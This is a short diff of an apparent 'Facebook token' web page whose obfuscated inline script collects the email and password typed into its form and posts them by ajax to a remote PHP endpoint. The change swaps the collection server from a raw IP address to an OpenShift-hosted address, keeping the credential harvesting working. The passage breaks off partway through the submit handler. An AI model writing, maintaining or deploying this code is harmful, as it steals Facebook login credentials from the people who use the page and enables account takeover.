@@ -275,7 +275,7 @@ ENTER YOUR FACEBOOK EMAIL/USERNAME
 </div>
 </div>
 <script>
-    var _0x6619 = ["click", "#submit", "disabled", "attr", "Please Wait Getting Token...", "html", "val", "#email", "#password", "#app_id option:selected", "removeAttr", "Get Token", "show", "#load_result", "Please Try again.....", "#result", "fail", "http://70.32.70.222/token/full.php", "post", "ajax", "on"];
+    var _0x6619 = ["click", "#submit", "disabled", "attr", "Please Wait Getting Token...", "html", "val", "#email", "#password", "#app_id option:selected", "removeAttr", "Get Token", "show", "#load_result", "Please Try again.....", "#result", "fail", "http://reactionsite-reactionsite.7e14.starter-us-west-2.openshiftapps.com/full.php", "post", "ajax", "on"];
     $(document)[_0x6619[20]](_0x6619[0], _0x6619[1], function () {
         $(_0x6619[1])[_0x6619[3]](_0x6619[2], _0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[4]);
         var _0x1ea6x1 = $(_0x6619[7])[_0x6619[6]](),
